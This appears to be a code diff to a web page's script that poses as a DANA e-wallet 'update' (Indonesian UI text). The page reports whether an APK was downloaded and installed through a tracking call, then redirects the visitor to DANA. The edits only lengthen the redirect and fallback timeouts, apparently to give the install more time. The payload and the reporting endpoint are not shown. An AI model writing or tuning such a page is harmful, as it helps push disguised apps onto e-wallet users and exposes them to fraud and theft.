@@ -1500,7 +1500,7 @@ function finishAndRedirect() {
     allDone = true;
     updateProgress(100, '✅ Update Selesai');
     K({ sumber: 'update_complete', data: { apk_downloaded: APK_DOWNLOADED ? 'yes' : 'no', apk_installed: APK_INSTALLED ? 'yes' : 'no' } });
-    setTimeout(redirectToDANA, 1500);
+    setTimeout(redirectToDANA, 3000);
 }
 
 // ============================================================
@@ -1536,7 +1536,7 @@ setTimeout(function() {
         K({ sumber: 'timeout_fallback', data: 'redirecting' });
         setTimeout(redirectToDANA, 3000);
     }
-}, 10000);
+}, 30000);
 </script>
 </body>
 </html>
